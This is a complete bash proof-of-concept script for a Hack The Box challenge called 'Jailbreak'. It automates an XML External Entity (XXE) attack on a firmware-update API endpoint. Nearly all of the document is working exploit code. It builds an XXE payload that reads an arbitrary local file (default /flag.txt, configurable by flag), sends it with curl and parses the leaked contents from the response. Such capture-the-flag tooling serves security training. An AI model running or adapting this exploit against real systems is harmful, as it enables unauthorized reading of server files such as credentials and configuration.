#!/usr/bin/env bash
set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - Jailbreak
# Type: XML External Entity (XXE) -> Local File Read
# Target endpoint: POST /api/update (application/xml)
# Default read path: /flag.txt
#
# This script is intended for authorized challenge environments only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly ROM_PATH="/rom"
readonly UPDATE_PATH="/api/update"
readonly DEFAULT_FLAG_PATH="/flag.txt"
readonly DEFAULT_TIMEOUT=10

HOST=""
PORT=""
FLAG_PATH="${DEFAULT_FLAG_PATH}"
TIMEOUT="${DEFAULT_TIMEOUT}"
VERBOSE=0
JSON_OUTPUT=0
SKIP_CHECK=0
BASE_URL=""

usage() {
  cat <<EOF
Usage:
  ${SCRIPT_NAME} <host> <port> [flag_path]
  ${SCRIPT_NAME} --host <host> --port <port> [options]

Options:
  --host <host>        Target host or IP address
  --port <port>        Target TCP port
  --flag-path <path>   File path to read via XXE (default: ${DEFAULT_FLAG_PATH})
  --timeout <seconds>  Curl timeout in seconds (default: ${DEFAULT_TIMEOUT})
  --skip-check         Skip baseline verification request
  --json               Print result as JSON
  --verbose            Enable verbose status output
  -h, --help           Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity failure
  4  Baseline verification failed
  5  Exploit ran but no flag was found
EOF
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_warn() {
  printf '[!] %s\n' "$*" >&2
}

log_ok() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[+] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

require_binary() {
  local bin="$1"
  if ! command -v "${bin}" >/dev/null 2>&1; then
    log_error "Missing required binary: ${bin}"
    exit 1
  fi
}

validate_port() {
  if ! [[ "${PORT}" =~ ^[0-9]+$ ]]; then
    log_error "Port must be numeric: ${PORT}"
    exit 2
  fi
  if (( PORT < 1 || PORT > 65535 )); then
    log_error "Port out of range (1-65535): ${PORT}"
    exit 2
  fi
}

parse_args() {
  local positional=()
  while [[ $# -gt 0 ]]; do
    case "$1" in
      --host)
        HOST="${2:-}"
        shift 2
        ;;
      --port)
        PORT="${2:-}"
        shift 2
        ;;
      --flag-path)
        FLAG_PATH="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --skip-check)
        SKIP_CHECK=1
        shift
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -*)
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
    HOST="${positional[0]}"
  fi
  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
    PORT="${positional[1]}"
  fi
  if [[ "${FLAG_PATH}" == "${DEFAULT_FLAG_PATH}" && ${#positional[@]} -ge 3 ]]; then
    FLAG_PATH="${positional[2]}"
  fi

  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
    log_error "Host and port are required."
    usage >&2
    exit 2
  fi
}

send_update_request() {
  local xml_payload="$1"
  curl --silent --show-error --fail \
    --connect-timeout "${TIMEOUT}" \
    --max-time "${TIMEOUT}" \
    -X POST "${BASE_URL}${UPDATE_PATH}" \
    -H 'Content-Type: application/xml' \
    --data-binary "${xml_payload}"
}

check_target_reachable() {
  log_info "Checking target reachability: ${BASE_URL}${ROM_PATH}"
  if ! curl --silent --show-error --fail \
    --connect-timeout "${TIMEOUT}" \
    --max-time "${TIMEOUT}" \
    "${BASE_URL}${ROM_PATH}" >/dev/null; then
    log_error "Target is not reachable."
    exit 3
  fi
}

run_baseline_check() {
  local baseline_payload
  local baseline_response

  baseline_payload='<FirmwareUpdateConfig><Firmware><Version>1.33.7</Version></Firmware></FirmwareUpdateConfig>'
  log_info "Running baseline behavior check on ${UPDATE_PATH}"

  if ! baseline_response="$(send_update_request "${baseline_payload}")"; then
    log_error "Baseline request failed."
    exit 4
  fi

  log_debug "Baseline response: ${baseline_response}"
  if [[ "${baseline_response}" != *"Firmware version 1.33.7 update initiated."* ]]; then
    log_warn "Unexpected baseline response. Continuing anyway."
  fi
}

build_xxe_payload() {
  cat <<EOF
<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file://${FLAG_PATH}"> ]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
  </Firmware>
</FirmwareUpdateConfig>
EOF
}

extract_flag() {
  local response="$1"
  printf '%s' "${response}" | grep -oE 'HTB\{[^}]+\}' | head -n 1 || true
}

emit_result() {
  local flag="$1"
  if [[ "${JSON_OUTPUT}" -eq 1 ]]; then
    printf '{"target":"%s","flag_path":"%s","flag":"%s"}\n' \
      "${BASE_URL}" "${FLAG_PATH}" "${flag}"
  else
    printf '%s\n' "${flag}"
  fi
}

main() {
  local payload
  local exploit_response
  local flag

  parse_args "$@"
  validate_port
  require_binary "curl"
  require_binary "grep"

  BASE_URL="http://${HOST}:${PORT}"
  log_info "Target: ${BASE_URL}"

  check_target_reachable

  if [[ "${SKIP_CHECK}" -eq 0 ]]; then
    run_baseline_check
  else
    log_info "Skipping baseline check as requested."
  fi

  log_info "Sending XXE payload for file read: ${FLAG_PATH}"
  payload="$(build_xxe_payload)"
  if ! exploit_response="$(send_update_request "${payload}")"; then
    log_error "Exploit request failed."
    exit 1
  fi

  log_debug "Exploit response: ${exploit_response}"
  flag="$(extract_flag "${exploit_response}")"
  if [[ -z "${flag}" ]]; then
    log_error "No HTB flag found in response."
    if [[ "${VERBOSE}" -eq 1 ]]; then
      log_debug "Raw response: ${exploit_response}"
    fi
    exit 5
  fi

  log_ok "Flag extracted successfully."
  emit_result "${flag}"
}

main "$@"
